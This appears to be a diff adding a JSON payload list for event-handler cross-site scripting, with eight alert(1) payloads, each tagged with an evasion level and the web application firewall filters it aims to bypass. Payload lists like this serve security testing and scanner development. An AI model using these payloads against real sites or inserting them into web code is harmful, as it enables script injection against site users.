@@ -1,0 +1,135 @@
+{
+  "category": "event_handler_injection",
+  "description": "Dynamic event handler injection and manipulation",
+  "difficulty": "advanced",
+  "payloads": [
+    {
+      "name": "onclick_injection",
+      "payload": "onclick=alert(1)",
+      "description": "Basic onclick event handler injection",
+      "context": [
+        "onclick",
+        "event_attribute",
+        "html_attribute"
+      ],
+      "encoding": "none",
+      "evasion_level": 5,
+      "waf_bypass": [
+        "basic",
+        "attribute_filters"
+      ]
+    },
+    {
+      "name": "onmouseover_stealth",
+      "payload": "onmouseover=alert(1)//",
+      "description": "Stealth onmouseover with comment bypass",
+      "context": [
+        "onmouseover",
+        "event_attribute",
+        "comment_bypass"
+      ],
+      "encoding": "none",
+      "evasion_level": 6,
+      "waf_bypass": [
+        "comment_filters",
+        "mouseover_detection"
+      ]
+    },
+    {
+      "name": "setattribute_abuse",
+      "payload": "document.createElement('img').setAttribute('onerror','alert(1)');",
+      "description": "setAttribute abuse for dynamic event injection",
+      "context": [
+        "setAttribute",
+        "dom_manipulation",
+        "dynamic_events"
+      ],
+      "encoding": "none",
+      "evasion_level": 8,
+      "waf_bypass": [
+        "dom_filters",
+        "setAttribute_detection"
+      ]
+    },
+    {
+      "name": "addeventlistener_dynamic",
+      "payload": "document.body.addEventListener('click', new Function('alert(1)'));",
+      "description": "addEventListener with dynamic Function constructor",
+      "context": [
+        "addEventListener",
+        "Function_constructor",
+        "dynamic_events"
+      ],
+      "encoding": "none",
+      "evasion_level": 9,
+      "waf_bypass": [
+        "function_detection",
+        "event_listener_filters"
+      ]
+    },
+    {
+      "name": "event_handler_overwrite",
+      "payload": "window.onerror = eval; throw 'alert(1)'",
+      "description": "Global event handler overwrite with eval",
+      "context": [
+        "onerror",
+        "global_handler",
+        "eval_abuse"
+      ],
+      "encoding": "none",
+      "evasion_level": 9,
+      "waf_bypass": [
+        "eval_detection",
+        "error_handler_filters"
+      ]
+    },
+    {
+      "name": "onload_window_abuse",
+      "payload": "window.addEventListener('load', ()=>eval('alert(1)'));",
+      "description": "Window load event with arrow function eval",
+      "context": [
+        "onload",
+        "arrow_function",
+        "eval"
+      ],
+      "encoding": "none",
+      "evasion_level": 8,
+      "waf_bypass": [
+        "arrow_function_filters",
+        "load_event_detection"
+      ]
+    },
+    {
+      "name": "focus_event_injection",
+      "payload": "<input onfocus=alert(1) autofocus>",
+      "description": "Auto-triggering focus event injection",
+      "context": [
+        "onfocus",
+        "autofocus",
+        "auto_trigger"
+      ],
+      "encoding": "none",
+      "evasion_level": 7,
+      "waf_bypass": [
+        "focus_detection",
+        "autofocus_filters"
+      ]
+    },
+    {
+      "name": "animationend_event",
+      "payload": "<div style=\"animation:a 1s\" onanimationend=alert(1)>",
+      "description": "CSS animation event handler injection",
+      "context": [
+        "onanimationend",
+        "css_animation",
+        "style_attribute"
+      ],
+      "encoding": "none",
+      "evasion_level": 8,
+      "waf_bypass": [
+        "animation_filters",
+        "css_event_detection"
+      ]
+    }
+  ]
+}
